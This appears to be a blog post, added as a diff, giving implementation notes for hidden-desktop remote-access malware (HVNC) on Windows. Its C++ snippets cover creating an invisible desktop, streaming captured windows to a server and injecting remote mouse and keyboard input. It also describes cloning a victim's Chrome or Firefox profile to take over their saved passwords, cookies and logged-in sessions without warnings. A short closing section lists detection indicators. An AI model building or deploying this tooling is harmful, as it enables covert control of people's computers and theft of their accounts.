@@ -1,0 +1,141 @@
+export const metadata = {
+  title: 'Notes on Hidden Desktop',
+  date: '2024.11.13',
+  description: 'HVNC implementation notes',
+}
+
+# Notes on Hidden Desktop
+
+Windows supports multiple desktop objects per session. The visible desktop is just one of them. You can create another that runs in parallel without showing anything on the user's screen.
+
+```cpp
+HDESK hDesk = CreateDesktopA("HiddenDesktop", NULL, NULL, 0, GENERIC_ALL, NULL);
+SetThreadDesktop(hDesk);
+
+STARTUPINFO si = {0};
+si.cb = sizeof(si);
+si.lpDesktop = "HiddenDesktop";
+CreateProcess("C:\\Windows\\explorer.exe", NULL, NULL, NULL, 
+              FALSE, 0, NULL, NULL, &si, &pi);
+```
+
+Once you call `SetThreadDesktop()`, everything you spawn goes to that desktop. The `lpDesktop` field in `STARTUPINFO` controls which desktop a process starts in.
+
+## Architecture
+
+Two threads do everything:
+
+- **Desktop Thread**: Captures frames from the hidden desktop and streams them to the server
+- **Input Thread**: Receives mouse/keyboard events from the server and posts them to windows on the hidden desktop
+
+Both connect to the same server socket. Handshake is 7 bytes "MELTED\0" followed by 4-byte connection type (0 for desktop thread, 1 for input thread).
+
+## Screen Capture
+
+Using `BitBlt` on the desktop DC only gets what's currently visible on top. Minimized or obscured windows don't show up. Better to enumerate windows individually:
+
+```cpp
+HWND hWnd = GetTopWindow(NULL);
+hWnd = GetWindow(hWnd, GW_HWNDLAST);
+// Start from bottom
+
+while (hWnd != NULL) {
+    if (IsWindowVisible(hWnd)) {
+        GetWindowRect(hWnd, &rect);
+        // PrintWindow captures window content even if minimized
+        PrintWindow(hWnd, hDcWindow, 0);
+BitBlt(hDcScreen, rect.left, rect.top, 
+               rect.right - rect.left, rect.bottom - rect.top,
+               hDcWindow, 0, 0, SRCCOPY);
+}
+    hWnd = GetWindow(hWnd, GW_HWNDPREV);  // Walk upward
+}
+```
+
+Start from the bottom window with `GW_HWNDLAST`, walk upward with `GW_HWNDPREV`. `PrintWindow()` captures each window's content even if it's minimized or behind other windows.
+
+To avoid sending identical frames, compare each pixel to the previous capture:
+
+```cpp
+for (DWORD i = 0; i < imageSize; i += 3) {
+    if (pixels[i] == oldPixels[i] && 
+        pixels[i+1] == oldPixels[i+1] && 
+        pixels[i+2] == oldPixels[i+2]) {
+        // Mark unchanged pixels with specific color
+        pixels[i] = 255;
+pixels[i+1] = 174;
+        pixels[i+2] = 201;
+    }
+}
+```
+
+Unchanged pixels become RGB(255, 174, 201). The server knows to skip these. If every pixel matches, send 0 to the server and skip transmission entirely. Compress the result with `RtlCompressBuffer()` using LZNT1 format before sending.
+
+## Input Routing
+
+Events arrive as (msg, wParam, lParam) tuples. For mouse events, need to find which window and control the coordinates actually point to:
+
+```cpp
+POINT point;
+point.x = GET_X_LPARAM(lParam);
+point.y = GET_Y_LPARAM(lParam);
+
+// Find top-level window
+HWND hWnd = WindowFromPoint(point);
+
+// Convert to window coordinates
+ScreenToClient(hWnd, &point);
+// Walk down to find actual control
+HWND child = ChildWindowFromPoint(hWnd, point);
+while (child != NULL && child != hWnd) {
+    hWnd = child;
+    ScreenToClient(hWnd, &point);
+child = ChildWindowFromPoint(hWnd, point);
+}
+
+// Post message with corrected coordinates
+lParam = MAKELPARAM(point.x, point.y);
+PostMessageA(hWnd, msg, wParam, lParam);
+```
+
+`WindowFromPoint()` gives you the top-level window. Convert to client coordinates with `ScreenToClient()`, then walk the child hierarchy with `ChildWindowFromPoint()` until you hit the actual control.
+
+For window dragging, check `WM_NCHITTEST` to see if the mouse is on the title bar or window edge. Then call `MoveWindow()` directly with adjusted coordinates:
+
+```cpp
+LRESULT hitTest = SendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
+if (hitTest == HTCAPTION) {
+    // Dragging title bar - move entire window
+    int moveX = lastPoint.x - currentPoint.x;
+int moveY = lastPoint.y - currentPoint.y;
+    MoveWindow(hWnd, x - moveX, y - moveY, width, height, FALSE);
+}
+```
+
+## Browser Profile Cloning
+
+The key feature: clone the user's browser profile before launching so you get their saved passwords and active sessions.
+
+**Chrome**: Copy %LOCALAPPDATA%\Google\Chrome\User Data\Default to a new directory
+
+**Firefox**: Parse %APPDATA%\Mozilla\Firefox\profiles.ini to find the profile path, then copy that directory
+
+Launch the browser pointing to the cloned profile:
+
+```cpp
+char cmd[MAX_PATH];
+sprintf(cmd, "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" "
+             "--user-data-dir=\"%s\"", clonedProfilePath);
+STARTUPINFO si = {0};
+si.cb = sizeof(si);
+si.lpDesktop = "HiddenDesktop";
+CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+```
+
+Browser sees it as a legitimate profile. No warnings. Everything just works including saved passwords, cookies, and active login sessions.
+
+## Detection
+
+Detection is difficult because most standard tools focus on the visible desktop. Task Manager won't show the desktop assignment, though Process Explorer's Environment tab and Sysinternals Desktops.exe can reveal the hidden object. Indicators include multiple explorer.exe instances, browsers launching with non-standard user data paths, or simultaneous network connections to the same IP. EDR telemetry often lacks visibility into thread-specific desktop assignments, leaving this specific object boundary unmonitored.
+
+Source code at: [github.com/Meltedd/HVNC](https://github.com/Meltedd/HVNC)
